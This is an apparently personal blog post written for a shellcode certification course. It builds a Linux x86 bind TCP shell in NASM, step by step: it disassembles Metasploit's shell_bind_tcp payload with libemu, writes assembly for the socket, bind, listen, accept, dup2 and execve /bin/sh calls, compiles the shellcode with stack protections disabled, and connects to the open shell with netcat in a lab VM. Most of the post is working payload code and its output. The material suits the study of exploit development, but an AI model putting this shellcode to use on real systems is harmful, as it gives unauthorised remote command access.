---
layout: post
title: SLAE Assignment 1 - Bind TCP Shell
date: '2016-12-05T19:40:00.000-06:00'
author: Sanjiv Kawa
tags:
- SLAE
- SecurityTube
- Assignment
- Shellcode
- nasm
- assembly
- bind shell
comments: true
---

### SLAE Assignment Stub
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>

Student ID: SLAE-807


### Assignment 1 Requirements
- Create a shell bind TCP shellcode
- The port number should be easily configurable
- Create a wrapper script that takes the port number or mark the specific byte in the shellcode that needs to be replaced

### The Bind TCP shell
The bind TCP shell creates a local socket and listens for an incoming connection. Once a client connects, a `/bin/sh` is presented on a user supplied network port

The bind TCP shell can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/bind.nasm">here</a>.

A wrapper for the shellcode can be found here <a href="https://github.com/skahwah/slae/blob/master/assignment1/shellcode-bind.c">here</a>.

Compile it using these options: `gcc -fno-stack-protector -z execstack shellcode-bind.c -o shellcode-bind`


A network port to hex converter can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/networkhex.rb">here</a>.

~~~ ruby
08:25 skawa@skawa-mbp: Desktop $ ruby networkhex.rb
IP: 192.168.156.156 is \xc0\xa8\x9c\x9c
Port: 3879 is \x0f\x27
08:25 skawa@skawa-mbp: Desktop $
~~~


### Examining a Bind TCP shell
Before trying to write a bind TCP shell in assembly, it can be useful to disassemble an existing payload and understand all of the components at play.

Libemu is a fantastic emulator that can help with running and disassembling shellcode in to meaningful segments and instructions.

The example shellcode below is the `linux/x86/shell_bind_tcp` payload part of `msfvenom`.

~~~ c
skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell_bind_tcp -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000
verbose = 3

...
<snippet>
...

int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 =>
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 =>
         none;
     int addrlen = 0x00000010 =>
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;
int dup2 (
     int oldfd = 19;
     int newfd = 13;
) =  13;

...
<snippet>
...

int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 =>
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa =>
               = 0x00416fb2 =>
                   = "/bin//sh";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;
~~~

After examining the `linux/x86/shell_bind_tcp` payload, it is fairly evident that the ingredients for a bind shell can be broken up in to the following segments:

- socket
- bind
- listen
- accept
- dup2
- execve

### Socket
The first thing to do is identify the system call for sockets, this is `socketcall` and has a value of `102`.

~~~ bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socketcall		102
~~~

The arguments required by the `socketcall` syscall can then be identified. As seen below, the two arguments that are required are `call`, which is the particular function that is going to be invoked, as well as arguments for the `call` that is being used.

~~~ bash
SYNOPSIS
       int socketcall(int call, unsigned long *args)
~~~

As the creation of a new socket needs to take place, the function that is going to be called by `socketcall` is `socket`. The `net` header file contains the integer that needs to be specified for the `socket` function; this is `1`.

~~~ bash
skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/linux/net.h | grep SOCKET
 * NET		An implementation of the SOCKET network access protocol.
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
skawa@ubuntu:~/libemu/tools/sctest$
~~~

Next, the arguments that are required by the `socket` function can be looked into.

~~~ bash
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);
~~~

The `domain` argument requires a communication protocol. After checking the `socket` header file, the protocol that needs to be selected is `PF_INET`; this is `2`.

~~~ bash
skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/i386-linux-gnu/bits/socket.h | grep "Protocol families." -A 8
/* Protocol families.  */
#define	PF_UNSPEC	0	/* Unspecified.  */
#define	PF_LOCAL	1	/* Local to host (pipes and file-domain).  */
#define	PF_UNIX		PF_LOCAL /* POSIX name for PF_LOCAL.  */
#define	PF_FILE		PF_LOCAL /* Another non-standard name for PF_LOCAL.  */
#define	PF_INET		2	/* IP protocol family.  */
#define	PF_AX25		3	/* Amateur Radio AX.25.  */
#define	PF_IPX		4	/* Novell Internet Protocol.  */
#define	PF_APPLETALK	5	/* Appletalk DDP.  */
skawa@ubuntu:~/libemu/tools/sctest$
~~~

Next, the `type` argument requires a communication type. After checking the `socket` header file, the socket type that needs to be selected is `SOCK_STREAM`; this is `1`.

~~~ bash
skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/i386-linux-gnu/bits/socket.h | grep "Types of sockets" -A 7
/* Types of sockets.  */
enum __socket_type
{
  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
				   byte streams.  */
#define SOCK_STREAM SOCK_STREAM
  SOCK_DGRAM = 2,		/* Connectionless, unreliable datagrams
				   of fixed maximum length.  */
skawa@ubuntu:~/libemu/tools/sctest$
~~~

The `protocol` argument needs to set. According to the `socket` manual:

~~~ bash
The  protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
~~~

As such, the value supplied to the `protocol` can be set to `0x0`

Having fulfilled the requirements for the `socket` function, the socket segment can now be created.

~~~ nasm
xor ebx, ebx ;zero out ebx
mul ebx ;this zeros out eax and edx also

mov al, 0x66 ;socketcall syscall
mov bl, 0x1 ;socketcall type, socket

;populate the stack with the arguments for socket
push edx ;socket protocol 0x0 is moved on to the stack
push ebx ;socket type 1, SOCK_STREAM, is moved on to the stack
push 0x2 ;socket domain 2, PF_INET, is moved on to the stack

;set up the socketcall syscall
mov ecx, esp  ;all arguments for socket, as required by socketcall are pointed to by ECX
int 0x80 ;execute socket syscall

xchg edx, eax ;move the return value from the socket syscall into edx for preservation, also zero out eax.
xor esi, esi ;clear out esi
~~~
One thing to note is that a socket file descriptor is returned to `EAX`. It will be important to preserve this for later use.

### Bind
Bind is a function that is also invoked by `socketcall`. The `net` header file contains the integer that needs to be specified for the `bind` function; this is `2`.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep -i bind
#define SYS_BIND	2		/* sys_bind(2)			*/
skawa@ubuntu:~/Desktop/code/assignment/assignment1$
~~~

Next, the arguments that are required by the `bind` function can be looked into.

~~~ bash
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
~~~

The `sockfd` argument requires the file descriptor returned by a socket creation. This is currently stored in both `EAX` and `EDX`, however, will be shortly removed from `EAX` once the system call is set up.

The `*addr` argument requires a socket address structure. There are different types of socket address structures, however the one of concern is `sockaddr_in`. The components required for this structure are quite simple, the address family, which is `AF_INET`, the same as `PF_INET`, or `2`. The port to bind to, and the IP address to listen on. If the IP address set to `0x0`, the `bind` will listen on all interfaces.

~~~ bash
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};
~~~

The `addrlen` argument requires the size of the struct in bytes.

Having fulfilled the requirements for the `bind` function, the bind segment can now be created.

~~~ nasm
mov al, 0x66 ;socketcall syscall
inc bl ;ebx contains 2, for the type of socketcall, which is bind

;populate the stack with the arguments for the sockaddr_in structure
push esi  ;sin_addr, 0, is pushed on to the stack (8 bytes)
push word 0x270f  ;sin_port, 3879, is pushed on to the stack (unsigned int, 16 bits) (4 bytes)
push word 0x2  ;sin_family, AF_NET, which is 2, the same as PF_INET (unsigned int, 16 bits) (4 bytes)

mov ecx, esp ;the stack pointer to the sockaddr_in structure is moved into ecx

push 0x10; push bind addrlen to the stack, the length of the struct is 16 bytes (8 + 4 + 4)
push ecx ;the stack pointer to the sockaddr_in structure pushed on to the stack
push edx; push bind sockfd to the stack, this is the value of the file descriptor returned to socket

mov ecx, esp ;update ecx to the stack pointer which currently contains a pointer to sockfd, sockaddr_in, addrlen. All arguments for bind, as required by socketcall are pointed to by ECX
int 0x80  ;execute bind syscall
~~~

### Listen
Listen is a function that is also invoked by `socketcall`. The `net` header file contains the integer that needs to be specified for the `listen` function; this is `4`.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep LISTEN
#define SYS_LISTEN	4		/* sys_listen(2)		*/
skawa@ubuntu:~/Desktop/code/assignment/assignment1$
~~~

Next, the arguments that are required by the `listen` function can be looked into.

~~~ bash
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int listen(int sockfd, int backlog);
~~~

The `sockfd` argument requires the file descriptor returned by a socket creation. This is currently stored in `EDX`.

The `backlog` argument requires the maximum length to which the queue of pending connections for `sockfd` may grow. This can be set to `0`.

Having fulfilled the requirements for the `listen` function, the listen segment can now be created.

~~~ nasm
mov al, 0x66 ;socketcall syscall
add bl, 0x2 ;ebx contains 4, for the type of socketcall, which is listen

;populate the stack with the arguments for listen
push esi  ;push listen backlog to the stack
push edx; push listen sockfd to the stack, this is the value of the file descriptor returned to socket

mov ecx, esp  ;all arguments for listen, as required by socketcall are pointed to by ECX
int 0x80  ;execute listen syscall
~~~

### Accept
Accept is a function that is also invoked by `socketcall`. The `net` header file contains the integer that needs to be specified for the `accept` function; this is `5`.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep ACCEPT
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
#define __SO_ACCEPTCON	(1 << 16)	/* performed a listen		*/
skawa@ubuntu:~/Desktop/code/assignment/assignment1$
~~~

Next, the arguments that are required by the `accept` function can be looked into.

~~~ bash
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
~~~

The `accept` function is required to accept any incoming connections by clients. As client related information is unknown and does not need to be restricted it does not need to be populated with meaningful data.

~~~ nasm
mov al, 0x66 ;socketcall syscall
inc bl ;ebx contains 5, for the type of socketcall, which is accept

;populate the stack with the arguments for accept
push esi  ;push accept addrlen to the stack
push esi  ;push accept sockaddr addr structure to the stack
push edx; push accept sockfd to the stack, this is the value of the file descriptor returned to socket

mov ecx, esp  ;All arguments for accept, as required by socketcall are pointed to by ECX
int 0x80  ;execute accept syscall

mov edx, eax ;move the return value from the accept syscall into EDX for preservation.
~~~

One thing to note is that a client socket file descriptor is returned to `EAX`. It will be important to preserve this for later use.

### Duplicate File Descriptor
Using the duplicate file descriptor, it will be possible to to redirect/duplicate STDIN(0), STDOUT(1) and STDERR(2) through the client socket file descriptor. Doing this makes the shell observable.

The first thing to do is identify the system call for `dup2`, this is `63`.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup
#define __NR_dup		 41
#define __NR_dup2		 63
#define __NR_dup3		330
skawa@ubuntu:~/Desktop/code/assignment/assignment1$
~~~

The arguments required by the `dup2` syscall can then be identified. As seen below, the two arguments that are required are `oldfd` and `newfd`.

~~~ bash
SYNOPSIS
       #include <unistd.h>

       int dup(int oldfd);
       int dup2(int oldfd, int newfd);
~~~

The `oldfd` argument will contain the client socket file descriptor, which is currently in the `EDX` register.

The `newfd` argument will contain the value for STDIN(0), STDOUT(1) and STDERR(2). The way this is achieved is through a loop that takes advantage of the signed flag. Once the value in `ECX` has been exhausted, the signed flag will be set, thus permitting the exit of the loop.

~~~ nasm
;dup2
mov ebx, edx ;move the client socket file descriptor into EBX to satisfy the oldf2 argument for dup2
xor ecx, ecx  ;clear out ecx
mov cl, 0x2 ;set 2 as the counter for the dup2 loop. The significance of 2 is for STDIN(0), STDOUT(1) and STDERR(2)

redirection_loop:
  mov al, 0x3f ;dup2 syscall
  int 0x80 ;execute dup2 syscall
  dec ecx ;decrement the loop counter
  jns redirection_loop ;conditional jump to the redirection_loop as long as the signed flag (SF) is not set.
~~~

### Execve
Considering that all input, output and error message have been redirected to the client, the last section to complete is the execution of a shell.

The instructions being used are for a really simple stack-based `execve` SYSCALL that executes `/bin/sh`.

The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here<a>.

~~~ nasm
xor eax, eax  ;zero out eax
push eax      ;push 00000000 on to the stack


push 0x68732f6e ;push hex hs/n on to the stack
push 0x69622f2f ;push hex ib// on to the stack

;at this point the stack contains //bin/sh0x00000000
mov ebx, esp  ;this satisfies the requirements for *filename (first argument of execve)

push eax      ;push 00000000 on to the stack

;at this point the stack contains 0x00000000//bin/sh0x00000000
mov edx, esp  ;we cant pop 0x00000000 into EDX as the shellcode cannot have any null characters.
              ;instead we move the current address pointed to by ESP into EDX.
              ;this address contains the last value pushed on to the stack, which is 0x00000000
              ;this satisfies the requirements for envp (third argument of execve)

push ebx      ;ebx contains the memory address of the stack where //bin/sh0x00000000 is.
mov ecx, esp  ;this satisfies the requirements for argv (second argument of execve)

mov al, 11     ;execve syscall number, 0xb works also.
int 0x80       ;initiate
~~~

### Testing Execution
I built on top of <a href="https://twitter.com/SecurityTube">Vivek\'s</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find `super-compile.sh` <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ls
bind.nasm  super-compile.sh
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ./super-compile.sh bind
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
[+] Creating Shellcode
[+] Compiling Shellcode
[+] Done!
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ls
bind  bind.nasm  bind.o  shellcode-bind  shellcode-bind.c  super-compile.sh
skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ./shellcode-bind
Shellcode Length: 103

~~~

#### Connecting
~~~ bash
19:04 skawa@skawa-mbp: ~ $ nc -nv 192.168.156.156 3879
found 0 associations
found 1 connections:
     1:	flags=82<CONNECTED,PREFERRED>
	outif vmnet8
	src 192.168.156.1 port 50727
	dst 192.168.156.156 port 3879
	rank info not available
	TCP aux info available

Connection to 192.168.156.156 port 3879 [tcp/*] succeeded!
uname -a
Linux ubuntu 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed Aug 14 15:31:16 UTC 2013 i686 i686 i386 GNU/Linux
whoami
skawa
^C
19:05 skawa@skawa-mbp: ~ $
~~~

#### Wrapper
For ease of configuration, I have put together a script that takes user supplied network information and converts it to hexadecimal. This can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/networkhex.rb">here</a>. The IP address is irrelevant for this particular case.

~~~ ruby
08:25 skawa@skawa-mbp: Desktop $ ruby networkhex.rb
IP: 192.168.156.156 is \xc0\xa8\x9c\x9c
Port: 3879 is \x0f\x27
08:25 skawa@skawa-mbp: Desktop $
~~~

The converted network port can then be placed into the `PORT` variable of the `C` shellcode wrapper. This can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/shellcode-bind.c">here</a>.
